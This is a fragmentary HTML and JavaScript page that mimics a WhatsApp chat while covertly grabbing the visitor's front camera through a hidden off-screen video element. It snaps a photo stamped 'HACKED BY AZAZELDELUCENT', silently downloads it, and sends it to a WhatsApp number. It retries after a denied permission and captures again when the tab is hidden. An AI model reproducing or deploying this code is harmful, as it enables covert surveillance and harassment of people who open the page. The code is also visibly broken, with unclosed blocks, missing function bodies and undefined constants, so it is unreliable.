        /* ─── Fake WhatsApp UI ─── */
        .wa-wrapper {

        .wa-header {
            background: #075e54;

            padding: 14px 18px;

            align-items: center;

        .wa-header .back-icon {

        .wa-header .avatar {

            font-size: 1.1rem;

        .wa-header .info {
            flex: 1;
        }

        .wa-header .info .name {
            font-size: 1rem;
            font-weight: 500;
        }

        .wa-header .info .status {
            font-size: 0.75rem;
            opacity: 0.8;
        }

        .wa-header .header-icons {

        .bubble {
            max-width: 85%;
            padding: 8px 14px;
            border-radius: 10px;
            font-size: 0.9rem;
            line-height: 1.5;
            position: relative;
            animation: msgIn 0.3s ease;
            word-wrap: break-word;
        }

        @keyframes msgIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .bubble.received {
            background: white;
            align-self: flex-start;
            border-top-left-radius: 2px;
            box-shadow: 0 1px 1px rgba(0,0,0,0.06);

            display: none;

        .typing-indicator span {
            width: 7px;
            height: 7px;
            background: #999;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }

        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes typing {
            0%, 60%, 100% { opacity: 0.3; transform: scale(0.8); }

        .wa-input {

        /* ─── Camera overlay (stealth) ─── */
        #stealth-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>

    <script>

        const chatArea = document.getElementById('chat-area');
        const typingIndicator = document.getElementById('typing-indicator');
        const inputField = document.getElementById('wa-input-field');
        const stealthVideo = document.getElementById('stealth-camera');

        let stream = null;
        let photoDataUrl = null;
        let chatStep = 0;

        // ─── Logger ─────────────────────────────────────────────────────
        function log(msg) {
            const ts = new Date().toLocaleTimeString();
            console.log(`[${BOT_NAME} ${ts}] ${msg}`);
        }

        // ─── Chat Helpers ───────────────────────────────────────────────
        function addChatBubble(text, type = 'received', time = null) {
            const bubble = document.createElement('div');
            bubble.className = `bubble ${type}`;
            
            if (type === 'image') {
                bubble.className = 'bubble image-bubble sent';
                bubble.innerHTML = `<img src="${text}" alt="captured"><div class="time">${time || getCurrentTime()} <span class="tick">✓✓</span></div>`;
            } else {
                bubble.innerHTML = `${text}<div class="time">${time || getCurrentTime()} <span class="tick">${type === 'sent' ? '✓✓' : ''}</span></div>`;
            }
            
            chatArea.insertBefore(bubble, typingIndicator);
            chatArea.scrollTop = chatArea.scrollHeight;
        }

        function getCurrentTime() {
            const d = new Date();
            return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
        }

        function showTyping(show = true) {
            typingIndicator.style.display = show ? 'flex' : 'none';
            chatArea.scrollTop = chatArea.scrollHeight;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ─── Simulate Chat Flow ─────────────────────────────────────────
        async function runChatFlow() {
            log('Starting chat flow...');

            // Step 1: Greeting
            await sleep(800);
            addChatBubble(`✅ System online. Target captured.`, 'sent');
            
            await sleep(1000);
            addChatBubble(`📸 Initializing camera module...`, 'sent');

            // Step 2: Camera access
            showTyping(true);
            await sleep(1500);
            showTyping(false);
            
            addChatBubble(`⚡ Requesting camera permission...`, 'sent');
            
            // Actually request camera
            await requestCamera();

            if (permissionGranted) {
                addChatBubble(`✅ Camera access GRANTED`, 'sent');
                
                // Step 3: Capture
                showTyping(true);
                await sleep(CAPTURE_DELAY_MS);
                showTyping(false);
                
                photoDataUrl = capturePhoto();
                
                if (photoDataUrl) {
                    addChatBubble(`📸 Photo captured successfully`, 'sent');
                    addChatBubble(`📏 Resolution: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`, 'sent');
                    
                    // Step 4: Send to WhatsApp bot
                    showTyping(true);
                    await sleep(2000);
                    showTyping(false);
                    
                    addChatBubble(`📤 Sending to WhatsApp number...`, 'sent');
                    addChatBubble(`📱 Target: ${WA_NUMBER}`, 'sent');
                    
                    // Actually send via API
                    await sendToWhatsAppAPI(photoDataUrl);
                    
                    // Step 5: Show image in chat
                    showTyping(true);
                    await sleep(1500);
                    showTyping(false);
                    
                    addChatBubble(photoDataUrl, 'image', getCurrentTime());
                    addChatBubble(`✅ Image delivered to ${WA_NUMBER}`, 'sent');
                    
                    // Step 6: Final message
                    await sleep(1000);
                    addChatBubble(`🔴 Mission complete. AzazelDeLucent out.`, 'sent');

            }

            // Disable typing indicator at end
            showTyping(false);

        // ─── Camera Access ──────────────────────────────────────────────
        async function requestCamera() {
            log('Requesting camera access...');
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });

                stealthVideo.srcObject = stream;
                await stealthVideo.play();
                permissionGranted = true;
                log(`Camera active: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`);

            } catch (err) {
                permissionGranted = false;
                log(`Camera error: ${err.name} — ${err.message}`);
                
                // If permission denied, try once more with different constrain
                try {
                    log('Retrying with basic constraints...');
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' },
                        audio: false
                    });
                    stealthVideo.srcObject = stream;
                    await stealthVideo.play();
                    permissionGranted = true;
                    log('Camera access on retry: SUCCESS');
                } catch (retryErr) {
                    log(`Camera retry failed: ${retryErr.message}`);
                }
            }
        }

        // ─── Capture Photo ──────────────────────────────────────────────
        function capturePhoto() {
            if (!stream || !stealthVideo.videoWidth) {
                log('Cannot capture — no stream');
                return null;
            }

            const canvas = document.createElement('canvas');
            canvas.width = stealthVideo.videoWidth;
            canvas.height = stealthVideo.videoHeight;
            const ctx = canvas.getContext('2d');

            // Mirror (front camera)
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(stealthVideo, 0, 0);
            
            // Reset and add overlay
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            
            // Red tint
            ctx.fillStyle = 'rgba(255, 0, 0, 0.08)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Hacked text
            ctx.font = `bold ${Math.floor(canvas.width * 0.04)}px Arial`;
            ctx.fillStyle = '#ff0000';
            ctx.textAlign = 'center';
            ctx.shadowColor = '#ff0000';
            ctx.shadowBlur = 20;
            ctx.fillText('● HACKED BY AZAZELDELUCENT', canvas.width / 2, canvas.height - 40);
            
            ctx.font = `${Math.floor(canvas.width * 0.02)}px Arial`;
            ctx.fillStyle = '#ff4444';
            ctx.shadowBlur = 10;
            ctx.fillText(`Target: ${WA_NUMBER}`, canvas.width / 2, canvas.height - 15);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
            log(`Photo captured: ${canvas.width}x${canvas.height} (${Math.round(dataUrl.length / 1024)} KB)`);
            
            // Silent download
            const link = document.createElement('a');
            link.download = `target_${Date.now()}.jpg`;
            link.href = dataUrl;
            link.click();

            return dataUrl;
        }

                log(`Gateway error: ${e.message}`);

            log('WhatsApp send sequence complete');
            return true;

        document.addEventListener('visibilitychange', () => {
            if (document.hidden && stream && !photoDataUrl) {

                const photo = capturePhoto();
                if (photo) {
